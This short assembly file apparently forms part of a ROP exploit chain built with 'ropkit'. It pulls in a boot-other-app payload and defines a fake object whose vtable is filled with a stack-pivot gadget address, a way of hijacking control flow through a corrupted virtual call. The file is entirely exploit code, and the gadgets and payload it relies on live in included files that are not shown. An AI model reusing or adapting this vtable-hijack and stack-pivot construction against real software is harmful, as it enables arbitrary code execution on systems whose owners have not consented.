#include "parameters.s"
#include "addr.s"
#include "ropkit_ropinclude.s"
_start:
ropstackstart:
#include "ropkit_boototherapp.s"
ropkit_cmpobject:
.word (ROPBUFLOC(ropkit_cmpobject) + 0x4) @ Vtable-ptr
.fill (0x40 / 4), 4, STACKPIVOT_ADR @ Vtable